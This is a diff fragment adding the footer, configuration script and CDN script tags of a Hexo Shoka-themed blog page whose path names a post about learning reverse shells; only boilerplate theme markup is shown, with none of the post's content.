+      <i class="ic i-coffee"></i>
+    </span>
+    <span title="站点阅读时长">2:16</span>
+  </div>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2023/06/21/反弹shell学习/',
+    favicon: {
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
